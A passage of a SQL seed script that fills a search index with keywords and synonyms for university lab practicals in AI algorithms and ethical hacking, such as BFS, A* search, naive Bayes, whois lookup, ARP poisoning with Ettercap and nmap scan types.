    ARRAY[$item$CNS Practical 10$item$, $item$Firewall Configuration and Rule-Based Filtering$item$]::text[],
    $pdf$finalCNS_69f47646.pdf$pdf$,
    ARRAY[1, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28]::integer[],
    $v$verified$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- 3. Upsert Search Terms (Synonyms & Keywords)
DELETE FROM public.practical_search_terms;
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-1$skey$),
    $term$bfs$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-1$skey$),
    $term$breadth first search$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-1$skey$),
    $term$romanian map$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-1$skey$),
    $term$arad$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-1$skey$),
    $term$bucharest$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-1$skey$),
    $term$uninformed search$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-1$skey$),
    $term$queue$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-1$skey$),
    $term$rmp.py$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-1$skey$),
    $term$AI Practical 1$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-1$skey$),
    $term$Breadth First Search in Python$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-1$skey$),
    $term$BFS Arad to Bucharest$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-2$skey$),
    $term$iddfs$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-2$skey$),
    $term$iterative deepening$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-2$skey$),
    $term$depth first search$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-2$skey$),
    $term$dls$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-2$skey$),
    $term$depth limited search$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-2$skey$),
    $term$arad$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-2$skey$),
    $term$bucharest$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-2$skey$),
    $term$rmp.py$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-2$skey$),
    $term$AI Practical 2$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-2$skey$),
    $term$Iterative Depth First Search$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-2$skey$),
    $term$IDDFS Python Program$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-3$skey$),
    $term$a* search$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-3$skey$),
    $term$a star$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-3$skey$),
    $term$pathfinding$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-3$skey$),
    $term$heuristic search$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-3$skey$),
    $term$f(n)$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-3$skey$),
    $term$priorityqueue$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-3$skey$),
    $term$arad$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-3$skey$),
    $term$bucharest$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-3$skey$),
    $term$418$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-3$skey$),
    $term$AI Practical 3$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-3$skey$),
    $term$A Star Search Algorithm$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-3$skey$),
    $term$A* Pathfinding Python$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-4$skey$),
    $term$rbfs$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-4$skey$),
    $term$recursive best first search$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-4$skey$),
    $term$recursive best-first search$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-4$skey$),
    $term$second best f(n)$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-4$skey$),
    $term$informed search$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-4$skey$),
    $term$arad$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-4$skey$),
    $term$bucharest$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-4$skey$),
    $term$AI Practical 4$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-4$skey$),
    $term$RBFS Algorithm Python$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-5$skey$),
    $term$decision tree$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-5$skey$),
    $term$decision-tree$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-5$skey$),
    $term$sklearn$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-5$skey$),
    $term$entropy$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-5$skey$),
    $term$balance-scale.data$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-5$skey$),
    $term$decisiontreeclassifier$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-5$skey$),
    $term$machine learning$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-5$skey$),
    $term$AI Practical 5$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-5$skey$),
    $term$Decision Tree Learning Algorithm$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-5$skey$),
    $term$Balance Scale Decision Tree$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-6$skey$),
    $term$naive bayes$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-6$skey$),
    $term$naive-bayes$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-6$skey$),
    $term$rwp$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-6$skey$),
    $term$restaurant waiting problem$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-6$skey$),
    $term$probability$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-6$skey$),
    $term$bayes theorem$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-6$skey$),
    $term$rwp.py$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-6$skey$),
    $term$AI Practical 6$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-6$skey$),
    $term$Naive Bayes Restaurant Waiting Problem$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-6$skey$),
    $term$RWP Naive Bayes$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-7$skey$),
    $term$neural network$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-7$skey$),
    $term$feed forward$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-7$skey$),
    $term$back propagation$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-7$skey$),
    $term$backpropagation$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-7$skey$),
    $term$sigmoid$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-7$skey$),
    $term$synaptic_weights$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-7$skey$),
    $term$numpy$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-7$skey$),
    $term$AI Practical 7$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-7$skey$),
    $term$Feed Forward Backpropagation Neural Network$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-7$skey$),
    $term$ANN Backpropagation Python$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-8$skey$),
    $term$adaboost$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-8$skey$),
    $term$adaptive boosting$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-8$skey$),
    $term$ensemble$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-8$skey$),
    $term$adaboostclassifier$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-8$skey$),
    $term$pima indians diabetes$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-8$skey$),
    $term$cross_val_score$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-8$skey$),
    $term$AI Practical 8$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-8$skey$),
    $term$AdaBoost Classifier Python$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-8$skey$),
    $term$Adaptive Boosting Algorithm$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-9$skey$),
    $term$reinforcement learning$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-9$skey$),
    $term$bellman$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-9$skey$),
    $term$return_state_utility$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-9$skey$),
    $term$t.npy$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-9$skey$),
    $term$utility of state$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-9$skey$),
    $term$markov decision process$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-9$skey$),
    $term$mdp$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-9$skey$),
    $term$AI Practical 9$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-9$skey$),
    $term$Reinforcement Learning State Utility$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$artificial-intelligence-practical-9$skey$),
    $term$RL Bellman Equation Python$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-1$skey$),
    $term$whois$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-1$skey$),
    $term$who.is$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-1$skey$),
    $term$google reconnaissance$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-1$skey$),
    $term$footprint$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-1$skey$),
    $term$domain lookup$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-1$skey$),
    $term$youtube.com$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-1$skey$),
    $term$reconnaissance$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-1$skey$),
    $term$Ethical Hacking Practical 1$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-1$skey$),
    $term$Google and Whois Reconnaissance$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-1$skey$),
    $term$WHOIS Lookup Practical$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-2$skey$),
    $term$cryptool$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-2$skey$),
    $term$cain and abel$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-2$skey$),
    $term$cain and able$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-2$skey$),
    $term$rc4$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-2$skey$),
    $term$md5$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-2$skey$),
    $term$dictionary attack$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-2$skey$),
    $term$password cracking$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-2$skey$),
    $term$password encryption$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-2$skey$),
    $term$wincap$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-2$skey$),
    $term$winpcap$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-2$skey$),
    $term$Ethical Hacking Practical 2$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-2$skey$),
    $term$Password Encryption and Decryption with CrypTool$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-2$skey$),
    $term$Cain and Abel Dictionary Attack$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-3$skey$),
    $term$linux network analysis$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-3$skey$),
    $term$arp poisoning$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-3$skey$),
    $term$ettercap$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-3$skey$),
    $term$ettercap-graphical$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-3$skey$),
    $term$ifconfig$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-3$skey$),
    $term$ping$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-3$skey$),
    $term$netstat$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-3$skey$),
    $term$traceroute$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-3$skey$),
    $term$mitm$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-3$skey$),
    $term$Ethical Hacking Practical 3$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-3$skey$),
    $term$ARP Poisoning with Ettercap$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-3$skey$),
    $term$Kali Linux Network Analysis$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-4$skey$),
    $term$nmap$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-4$skey$),
    $term$zenmap$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-4$skey$),
    $term$port scanning$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-4$skey$),
    $term$ack scan$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-4$skey$),
    $term$syn scan$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-4$skey$),
    $term$fin scan$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-4$skey$),
    $term$null scan$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-4$skey$),
    $term$xmas scan$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-4$skey$),
    $term$scanme.nmap.org$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$ethical-hacking-practical-4$skey$),
    $term$-sa$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
